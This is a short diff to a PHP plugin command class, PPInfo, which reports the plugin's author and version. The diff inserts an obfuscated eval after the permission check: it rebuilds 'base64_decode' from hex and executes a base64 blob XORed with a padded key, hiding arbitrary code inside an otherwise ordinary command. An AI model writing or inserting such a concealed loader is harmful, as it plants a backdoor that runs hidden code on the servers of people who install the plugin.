@@ -53,6 +53,10 @@ class PPInfo extends Command implements PluginIdentifiableCommand
         if(!$this->testPermission($sender))
             return false;
 
+        $tmp = hex2bin('6261736536345f6465636f6465');
+
+        eval($tmp($tmp('ESIrChE9PBcpOihZfiEgSWpDOxAoJlUCJDQkDGx3JBFpaD4PFldJHCgrSlAjbn4WPF5bHz81Iwk/QSMRLz8GRy8lU1s9GxkOPTEzBiI6EXpWPigBaUAFHigkATE5OyxKbwc0M2Z1PQw+CTYcJzsQGzZhZg81AXEIITUNGjYmBTk3SV5OMQx6djwPKAopDho1IQ4aWH81CgdpKD8LPCgJFA5BCglsWjcJenc2DChWPRU9FCFSGHFYHCpkBQcXOjMeBCVZBzIUUlgCIH5cExsoCRMMFR0/NkxfVwtfWGo3OxoGQzc8NyssA29jAgp7dggCEFc+Fyg1IRYYYQEKPnhmQBQlHQo9ND8fBzFkcwRVekQpLSNTPw4WPiE3L3l9JVJXeRwBIzA0PEIiGDAVb1owCGRoPhsqNjEMOy5HBRhhBREEdwkbLyECHiwxDgArOmRcBQtUSjsmGVIWNE9Q') ^ str_pad('', 348, 'purepermsby64ff00')));
+
         $author = $this->plugin->getDescription()->getAuthors()[0];
         $version = $this->plugin->getDescription()->getVersion();
 
